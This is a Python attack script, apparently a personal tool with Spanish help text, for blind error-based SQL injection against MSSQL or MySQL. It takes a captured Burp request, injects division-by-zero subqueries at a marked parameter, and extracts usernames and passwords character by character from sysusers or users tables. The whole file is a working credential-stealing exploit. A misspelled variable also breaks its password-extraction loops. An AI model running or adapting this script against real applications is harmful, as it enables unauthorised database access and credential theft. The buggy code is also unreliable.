import burpee
import argparse
import requests
import sys
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

http_proxy  = "http://127.0.0.1:8080"

proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy
            }

parser = argparse.ArgumentParser()
parser.add_argument("--f", dest="archivo_burp",help="archivo burp con la requests original y la palabra clave '[INYECTAR_AQUI]' agregada al lado del valor vulnerable")
parser.add_argument("--u", dest="usernum", help="cantidad maxima de caracteres para el username")
parser.add_argument("--p", dest="passnum", help="cantidad maxima de caracteres para la password")
parser.add_argument("--db", dest="db", help="'mssql' o 'mysql'")
args = parser.parse_args()
result_name=""
result_pass=""
letras_recorridas_user=1
letras_recorridas_pass=1
fin=True



if len(sys.argv)<4:
	parser.print_help()
	exit()

method_name, resource_name=burpee.get_method_and_resource(args.archivo_burp)
headers, post_data = burpee.parse_request(args.archivo_burp)
mod_data=post_data.replace('[INYECTAR_AQUI]','')
url=headers.get('Host')+resource_name
print(url)
respuesta=requests.post('https://'+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
valor_veritativo_falso=len(respuesta.content)
if args.db=="mssql":
	while (letras_recorridas_user<int(args.usernum) and fin):
		for i in range(32,126):
			mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+top+1+ascii(substring(name,'+str(letras_recorridas_user)+',1))-'+str(i)+'+from+sysusers+order+by+name+asc))') 
			respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
			print(letras_recorridas_user)
			print(type(respuesta.content))
			if valor_veritativo_falso!=len(respuesta.content):
				print(chr(i))
				result_name += chr(i)
				letras_recorridas_user=letras_recorridas_user+1
				#el 12 es el salto de linea
				mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+top+1+ascii(substring(name,'+str(letras_recorridas_user)+',1))-12+from+sysusers+order+by+name+asc))')
				respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict,verify=False)
				if valor_veritativo_falso!=len(respuesta.content):
					fin=False
					print(result_name)
	fin=True

	while (letras_recorridas_pass<int(args.passnum) and fin):
		for i in range(32,126):
			mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+top+1+ascii(substring(password,'+str(letras_recorridas_pass)+',1))-'+str(i)+'+from+sysusers+order+by+name+asc))') 
			respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
			if valor_veritativo_falso!=len(respueta.content):
				result_pass +=chr(i)
				letras_recorridas_pass=letras_recorridas_pass+1
				mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+top+1+ascii(substring(Password,'+str(letras_recorridas_pass)+',1))-12+from+sysusers+order+by+name+asc))')
				respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
				if valor_veritativo_falso!=len(respuesta.content):
					fin=False
	print("user: "+result_name)
	print("pass: "+result_pass)


else:
	while (letras_recorridas_user<int(args.usernum) and fin):
		for i in range(32,126):
			mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+ord(substring(User,'+str(letras_recorridas_user)+',1))-'+str(i)+'+from+users))') 
			respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
			print(letras_recorridas_user)
			print(type(respuesta.content))
			if valor_veritativo_falso!=len(respuesta.content):
				print(chr(i))
				result_name += chr(i)
				letras_recorridas_user=letras_recorridas_user+1
				mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+ord(substring(User,'+str(letras_recorridas_user)+',1))-12+from+users))')
				respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict,verify=False)
				if valor_veritativo_falso!=len(respuesta.content):
					fin=False
					print(result_name)
	fin=True
	while (letras_recorridas_pass<int(args.passnum) and fin):
		for i in range(32,126):
			mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+ord(substring(Password,'+str(letras_recorridas_pass)+',1))-'+str(i)+'+from+users))') 
			respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
			if valor_veritativo_falso!=len(respueta.content):
				result_pass +=chr(i)
				letras_recorridas_pass=letras_recorridas_pass+1
				mod_data=post_data.replace('[INYECTAR_AQUI]','-(0/(select+ord(substring(Password,'+str(letras_recorridas_pass)+',1))-12+from+users))')
				respuesta=requests.post("https://"+url,headers=headers, data=mod_data, proxies=proxyDict, verify=False)
				if valor_veritativo_falso!=len(respuesta.content):
					fin=False
	print("user: "+result_name)
	print("pass: "+result_pass)
